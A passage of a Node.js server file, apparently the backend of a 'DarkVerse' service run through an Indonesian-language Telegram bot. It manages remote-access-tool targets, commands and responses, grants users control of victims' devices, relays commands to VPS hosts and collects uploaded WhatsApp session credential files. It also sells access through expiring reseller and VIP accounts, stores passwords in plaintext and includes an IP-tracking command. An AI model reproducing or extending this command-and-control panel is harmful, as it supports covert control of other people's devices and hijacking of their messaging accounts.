      allowedDevices = targets.filter(t => userPerm.devices.includes(t.id));
    }
  } else {
    for (const owner of db.filter(u => u.role === "owner" || u.role === "dev")) {
      const perm = owner.ratPerms?.[user.username];
      if (!perm || !perm.approved) continue;
      const ownerDevices = targets.filter(t => t.owner === owner.username);
      if (perm.allDevices) {
        allowedDevices = allowedDevices.concat(ownerDevices);
      } else {
        allowedDevices = allowedDevices.concat(
          ownerDevices.filter(d => (perm.deviceIds || []).includes(d.id))
        );
      }
    }
  }

  res.json({ valid: true, pairId: null, role: user.role, devices: allowedDevices });
});

// ============================================
// ROUTES: MISC
// ============================================
app.get("/tq", async (req, res) => {
  res.json({ status: true, result: tqto });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

// ============================================
// API PREFIX ROUTER
// ============================================
app.post('/api/auth/validate', (req, res) => { req.url = '/validate'; app.handle(req, res); });
app.get('/api/auth/myInfo', (req, res) => { req.url = '/myInfo'; app.handle(req, res); });

app.post('/api/user/changepass', (req, res) => { req.url = '/changepass'; app.handle(req, res); });
app.get('/api/user/createAccount', (req, res) => { req.url = '/createAccount?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/deleteUser', (req, res) => { req.url = '/deleteUser?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/listUsers', (req, res) => { req.url = '/listUsers?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/userAdd', (req, res) => { req.url = '/userAdd?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/editUser', (req, res) => { req.url = '/editUser?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/getActivityLogs', (req, res) => { req.url = '/getLog?' + (req.url.split('?')[1]||''); app.handle(req, res); });

app.get('/api/device/getPerms', (req, res) => { req.url = '/devicePerms?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.post('/api/device/setPerm', (req, res) => { req.url = '/setDevicePerm?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/device/listPerms', (req, res) => { req.url = '/listDevicePerms?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/whatsapp/getPublicSenders', (req, res) => { req.url = '/getPublicSenders?' + (req.url.split('?')[1]||''); app.handle(req, res); });

app.get('/api/whatsapp/mySender', (req, res) => { req.url = '/mySender?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/whatsapp/getPairing', (req, res) => { req.url = '/getPairing?' + (req.url.split('?')[1]||''); app.handle(req, res); });

app.get('/api/vps/myServer', (req, res) => { req.url = '/myServer?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.post('/api/vps/addServer', (req, res) => { req.url = '/addServer'; app.handle(req, res); });
app.post('/api/vps/delServer', (req, res) => { req.url = '/delServer'; app.handle(req, res); });
app.post('/api/vps/sendCommand', (req, res) => { req.url = '/sendCommand'; app.handle(req, res); });

// ============================================
// INIT RAT FILES
// ============================================
['rat_targets','rat_commands','rat_responses','rat_notifs'].forEach(f => {
  const p = './' + f + '.json';
  if (!fs.existsSync(p)) fs.writeFileSync(p, '[]');
});

// ============================================
// WEBSOCKET
// ============================================
wss.on('connection', function (ws, req) {
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      if (data.type === 'sessionCheck') {
        const sessionList = loadKeyList();
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Invalid key"
          }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Another device has logged in"
          }));
          return ws.close();
        }
      }

      if (data.type === 'validate') {
        const session = loadKeyList();
        const validKey = session.find(e => e.sessionKey === data.key);
        const validId = session.find(e => e.androidId === data.androidId);

        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: session.username,
          androidId: session.androidId,
          role: session.role || "member"
        }));

        const interval = setInterval(() => {
          const session = loadKeyList();
          const validKey = session.find(e => e.sessionKey === data.key);
          const validId = session.find(e => e.androidId === data.androidId);

          if (!validKey) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "keyInvalid"
            }));
            return ws.close();
          }

          if (!validId) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "androidIdMismatch"
            }));
            return ws.close();
          }
        }, 10000);
      }

      if (data.type === 'auth') {
        username = getUserByKey(data.key);
        if (!username) return ws.close();
        wsClients[username] = ws;

        const list = chatList
          .filter(m => m.from === username || m.to === username)
          .map(m => (m.from === username ? m.to : m.from));

        ws.send(JSON.stringify({
          type: "chatList",
          users: [...new Set(list)],
        }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
        if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }

      if (data.type === 'global_message_send') {
        const { message, type, media, replyTo } = data;
        if (!message && type === 'text') return;

        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return;

        const now = Date.now();
        const globalChat = loadGlobalChat();
        const userRecent = globalChat.filter(m =>
          m.sender === username && (now - new Date(m.timestamp).getTime()) < 10000
        );
        if (userRecent.length >= 10) {
          ws.send(JSON.stringify({ type: 'error', message: 'Too many messages!' }));
          return;
        }

        const newMsg = {
          id: genMsgId(),
          sender: username,
          type: type || 'text',
          message: message?.substring(0, 2000) || '',
          media: media || null,
          replyTo: replyTo || null,
          timestamp: new Date().toISOString(),
          role: user.role
        };

        globalChat.push(newMsg);
        if (globalChat.length > 500) globalChat.splice(0, globalChat.length - 500);
        saveGlobalChat(globalChat);

        const profiles = loadUserProfiles();
        const broadcastMsg = {
          ...newMsg,
          senderProfile: profiles[username] || { username, name: username, avatar: null }
        };

        for (const [clientName, clientWs] of Object.entries(wsClients)) {
          if (clientWs.readyState === WebSocket.OPEN) {
            clientWs.send(JSON.stringify({ type: 'global_message', message: broadcastMsg }));
          }
        }
      }

      if (data.type === 'private_message_send') {
        const { toUser, message, type, media, replyTo, encrypted } = data;
        if ((!message && type === 'text') || !toUser) return;

        const db = loadDatabase();
        const targetExists = db.find(u => u.username === toUser);
        if (!targetExists) {
          ws.send(JSON.stringify({ type: 'error', message: 'User not found' }));
          return;
        }

        const now = Date.now();
        const privateChats = loadPrivateChat();
        const chatKey = `${username}_${toUser}`;
        const recentMsgs = (privateChats[chatKey] || []).filter(m =>
          (now - new Date(m.timestamp).getTime()) < 5000
        );
        if (recentMsgs.length >= 5) {
          ws.send(JSON.stringify({ type: 'error', message: 'Slow down!' }));
          return;
        }

        const newMsg = {
          id: genMsgId(),
          sender: username,
          receiver: toUser,
          type: type || 'text',
          message: message?.substring(0, 2000) || '',
          media: media || null,
          replyTo: replyTo || null,
          encrypted: encrypted || false,
          timestamp: new Date().toISOString()
        };

        if (!privateChats[chatKey]) privateChats[chatKey] = [];
        privateChats[chatKey].push(newMsg);
        if (privateChats[chatKey].length > 500) privateChats[chatKey].splice(0, privateChats[chatKey].length - 500);
        savePrivateChat(privateChats);

        const profiles = loadUserProfiles();
        const senderProfile = profiles[username] || { username, name: username, avatar: null };

        ws.send(JSON.stringify({
          type: 'private_message_sent',
          message: { ...newMsg, fromMe: true, senderProfile }
        }));

        if (wsClients[toUser] && wsClients[toUser].readyState === WebSocket.OPEN) {
          wsClients[toUser].send(JSON.stringify({
            type: 'private_message',
            message: { ...newMsg, fromMe: false, senderProfile }
          }));
        }

        for (const [clientName, clientWs] of Object.entries(wsClients)) {
          if ((clientName === username || clientName === toUser) && clientWs.readyState === WebSocket.OPEN) {
            clientWs.send(JSON.stringify({ type: 'refresh_chat_list' }));
          }
        }
      }

      if (data.type === 'mark_read') {
        const { withUser } = data;
        if (!withUser) return;

        const privateChats = loadPrivateChat();
        const chatKey = `${withUser}_${username}`;
        if (privateChats[chatKey]) {
          let changed = false;
          privateChats[chatKey] = privateChats[chatKey].map(m => {
            if (!m.read && m.sender === withUser) {
              changed = true;
              return { ...m, read: true };
            }
            return m;
          });
          if (changed) savePrivateChat(privateChats);
        }
      }

    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

// ============================================
// TELEGRAM BOT COMMANDS
// ============================================
bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.sendMessage(id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "CREATE ACCOUNT", callback_data: "create_custom" }],
        [{ text: "EXTEND EXPIRY", callback_data: "set_expire" }],
        ...(isOwner ? [[
          { text: "LIST ACCOUNTS", callback_data: "list_user" },
          { text: "DELETE ACCOUNT", callback_data: "delete_user" }
        ]] : [])
      ]
    }
  };

  bot.sendMessage(id, `👋 Halo ${msg.from.first_name}, pilih menu:`, options);
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now();
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.onText(/^\/?refresh/, async (msg) => {
  const config = loadTelegramConfig();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = config.ownerList.includes(userId);
  if (!isOwner) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  await startUserSessions();
  await bot.sendMessage(chatId, "⚠️ Server Is Refreshing wait for 30-60 Seconds.");
});

bot.onText(/^\/?globalsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "lu ngapain");
  }

  const connectedBiz = Object.keys(biz);
  const connectedMess = Object.keys(mess);
  const connectedNumbers = Object.keys(activeConnections);

  let message = `📌 Global Session\n\n`;

  message += 'Messenger Session:\n';
  message += connectedMess.length > 0
    ? connectedMess.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nBusiness Session:\n';
  message += connectedBiz.length > 0
    ? connectedBiz.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nActive Numbers:\n';
  message += connectedNumbers.length > 0
    ? connectedNumbers.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  bot.sendMessage(chatId, message);
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  switch (data) {
    case "create_member":
      bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role: "member", expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun member dibuat:
👤 Username: ${username}
🔐 Password: ${password}`);
      });
      break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, addDays] = msg.text.split("|");
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*
${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan: `username|password|role|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, role, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role, expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun ${role} dibuat:
👤 Username: ${username}`);
      });
      break;

    case "delete_user":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;
  }
});

bot.onText(/^\/?status$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const uptime = formatUptime(process.uptime());
    const ramUsage = process.memoryUsage().rss / 1024 / 1024;
    const cpuLoad = os.loadavg()[0];
    const db = loadDatabase();
    const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;

    const pingStart = Date.now();
    await axios.get(`http://localhost:${PORT}/ping`);
    const ping = Date.now() - pingStart;

    const text = `*DarkVerse Server Status*

*Server Online* [${new Date().toLocaleTimeString()}]
*Ping:* ~${ping}ms
*RAM:* ${ramUsage.toFixed(2)} MB
*CPU:* ${cpuLoad.toFixed(2)}
*Uptime:* ${uptime}
*Total Database:* ${dbLength}
*Server Protect*: *AXRRG-Secure*`;

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error("❌ Gagal ambil status:", err.message);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil status server.");
  }
});

bot.onText(/^\/?trackip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1].trim();

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(ip) && !/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(ip)) {
    return bot.sendMessage(chatId, "⚠️ Format IP / domain tidak valid.\n\nContoh:\n`/trackip 8.8.8.8`\n`/trackip google.com`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, "🔍 Sedang melacak informasi IP...");

  try {
    const { data } = await axios.get(`https://ipapi.co/${ip}/json/`);

    if (data.error) {
      return bot.sendMessage(chatId, `❌ Gagal melacak IP: ${data.reason || "tidak ditemukan."}`);
    }

    const info = `
*IP Tracker Result*

IP: ${data.ip || ip}
Kota: ${data.city || "-"}
Negara: ${data.country_name || "-"} (${data.country_code || "?"})
Zona Waktu: ${data.timezone || "-"}
ISP: ${data.org || "-"}
Latitude: ${data.latitude || "-"}
Longitude: ${data.longitude || "-"}

Database: ${data.asn || "-"}
    `.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

    if (data.latitude && data.longitude) {
      await bot.sendLocation(chatId, data.latitude, data.longitude);
    }

  } catch (err) {
    console.error("❌ Error trackip:", err.message);
    bot.sendMessage(chatId, "❌ Gagal mengambil data IP, coba lagi nanti.");
  }
});

// ============================================
// RESET FUNCTIONS
// ============================================
function doReset(role) {
  const db = loadDatabase();
  let deleted = [], remain = [];

  if (role === "all") {
    deleted = db.map(u => u.username);
    remain = [];
  } else {
    for (const u of db) {
      if ((u.role || "member") === role) deleted.push(u.username);
      else remain.push(u);
    }
  }

  saveDatabase(remain);
  fs.writeFileSync("reset_result.txt", deleted.join("\n") || "Tidak ada akun dihapus.");

  return deleted;
}

function registerResetButton(cmd, role) {
  bot.onText(new RegExp(`^\\/?${cmd}$`, "i"), async (msg) => {
    if (msg.from.id !== OWNER_ID) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

    const roleName = role === "all" ? "SEMUA AKUN" : `role *${role}*`;
    const opts = {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ Konfirmasi", callback_data: `confirm_${cmd}` }],
          [{ text: "❌ Batal", callback_data: "cancel_reset" }]
        ]
      }
    };
    bot.sendMessage(msg.chat.id, `⚠️ Apakah kamu yakin ingin menghapus ${roleName}?`, opts);
  });

  bot.on("callback_query", async (query) => {
    const data = query.data;
    const fromId = query.from.id;
    const chatId = query.message.chat.id;

    if (data === `confirm_${cmd}`) {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }

      const deleted = doReset(role);
      const info = deleted.length > 0 ? `✅ ${deleted.length} akun dihapus.` : "ℹ️ Tidak ada akun yang dihapus.";

      await bot.sendDocument(chatId, "reset_result.txt", {
        caption: `*Berhasil menghapus ${deleted.length} akun*\n${role === "all" ? "🗑 Semua akun" : `🗑 Role: ${role}`}`,
        parse_mode: "Markdown"
      });
      return bot.answerCallbackQuery(query.id, { text: info });
    }

    if (data === "cancel_reset") {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }
      bot.answerCallbackQuery(query.id, { text: "❌ Dibatalkan." });
      bot.sendMessage(chatId, "🚫 Aksi reset dibatalkan.");
    }
  });
}

registerResetButton("resetakunowner", "owner");
registerResetButton("resetakunreseller", "reseller");
registerResetButton("resetakunvip", "vip");
registerResetButton("resetakunmember", "member");
registerResetButton("resetall", "all");

// ============================================
// INFO COMMAND
// ============================================
bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (fromId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const username = match[1].trim().toLowerCase();

  try {
    if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");

    const db = loadDatabase();
    const keys = loadKeyList();

    const dbUser = db.find(u => (u.username || "").toLowerCase() === username);
    const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);

    if (!dbUser && !keyUser) {
      return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    const role = dbUser?.role || "member";
    const expired = dbUser?.expiredDate || "Tidak ada";
    const lastSend = dbUser?.lastSend
      ? new Date(dbUser.lastSend).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum pernah";

    const lastLogin = keyUser?.lastLogin
      ? new Date(keyUser.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum login";
    const ip = keyUser?.ipAddress || "Tidak diketahui";
    const android = keyUser?.androidId || "-";
    const session = keyUser?.sessionKey || "-";

    const info = `
*INFORMASI AKUN*

*Username:* ${dbUser?.username || keyUser?.username || username}
*Role:* ${role}
*Expired Date:* ${expired}
*Terakhir Kirim:* ${lastSend}
*Terakhir Login:* ${lastLogin}
*IP Address:* ${ip}
*Android ID:* ${android}
*Session Key:* ${session}
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error info:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data akun.");
  }
});

// ============================================
// STATS COMMAND
// ============================================
const startTime = Date.now();

function getUptime() {
  const seconds = Math.floor((Date.now() - startTime) / 1000);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}j ${m}m ${s}d`;
}

bot.onText(/^\/?(stats|status)$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const db = loadDatabase();
    const totalUser = db.length;
    const countRole = (role) => db.filter(u => (u.role || "member") === role).length;

    const owners = countRole("owner");
    const resellers = countRole("reseller");
    const vips = countRole("vip");
    const members = countRole("member");

    const connectedMess = Object.keys(mess || {}).length || 0;
    const connectedBiz = Object.keys(biz || {}).length || 0;
    const connectedNumbers = Object.keys(activeConnections || {}).length || 0;

    const info = `
*Bot Statistics*

*Status:* Online
*Uptime:* ${getUptime()}

*User Data*
• Total User: ${totalUser}
• Owner: ${owners}
• Reseller: ${resellers}
• VIP: ${vips}
• Member: ${members}

*WhatsApp Session*
• Messenger: ${connectedMess}
• Business: ${connectedBiz}
• Active Numbers: ${connectedNumbers}

*Tanggal:* ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error stats:", err);
    bot.sendMessage(chatId, "❌ Gagal mengambil data stats.");
  }
});

bot.onText(/^\/?statususer$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const logPath = "logUser.txt";

    if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    const db = loadDatabase();

    if (!fs.existsSync(logPath)) return bot.sendMessage(chatId, "📊 Belum ada data log pembuatan akun.");

    const logs = fs.readFileSync(logPath, "utf-8").split("\n").filter(Boolean);

    const countMap = {};
    for (const line of logs) {
      const match = line.match(/^(\S+)\s+Created\s+/);
      if (match) {
        const creator = match[1];
        countMap[creator] = (countMap[creator] || 0) + 1;
      }
    }

    const list = db.map(u => ({
      username: u.username,
      role: u.role || "member",
      total: countMap[u.username] || 0
    }));

    list.sort((a, b) => b.total - a.total);

    let teks = `📊 STATUS USER & AKTIVITAS BOT\nGenerated: ${new Date().toLocaleString()}\n\n`;
    teks += `Username | Role | Total Akun Dibuat\n`;
    teks += `-------------------------------------\n`;

    for (const u of list) {
      teks += `${u.username} | ${u.role} | ${u.total}\n`;
    }

    const filePath = "./statususer.txt";
    fs.writeFileSync(filePath, teks);

    await bot.sendDocument(chatId, filePath, {
      caption: "📄 Berikut status semua user & jumlah akun yang telah mereka buat."
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error("[❌ STATUSUSER ERROR]", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat laporan status user.");
  }
});

bot.onText(/^\/?clearsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder session tidak ditemukan.");
    }

    fs.rmSync(SESSION_PATH, { recursive: true, force: true });
    fs.mkdirSync(SESSION_PATH, { recursive: true });

    bot.sendMessage(chatId, "✅ Semua session dihapus dengan sukses (folder *permenmd* dikosongkan).");
    console.log("🧹 Semua session telah dihapus melalui /clearsession");
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Gagal menghapus semua session.");
  }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder 'permenmd' tidak ditemukan.");
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    bot.sendMessage(chatId, `Berhasil menghapus ${deletedCount} folder session yang tidak berisi file .json.`);
    console.log(`🧹 ${deletedCount} folder session kosong dihapus.`);
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Terjadi error saat membersihkan session kosong.");
  }
});

bot.onText(/^\/?restart$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  console.log("♻️ Restart manual dijalankan...");
  setTimeout(() => {
    process.exit(0);
  }, 5000);
});

// ============================================
// WATCH VPS FILE
// ============================================
fs.watch(VPS_FILE, () => {
  try {
    if (fs.existsSync(VPS_FILE)) {
      const content = fs.readFileSync(VPS_FILE, 'utf8');
      vpsList = content.trim() ? JSON.parse(content) : [];
      console.log("🔄 VPS list updated.");
      connectToAllVPS();
    }
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

// ============================================
// START SERVER
// ============================================
server.listen(PORT, () => {
  console.log(`🚀 Server aktif di http://localhost:${PORT}`);
  startUserSessions();
  connectToAllVPS();
});

console.log('✅ Server siap!');
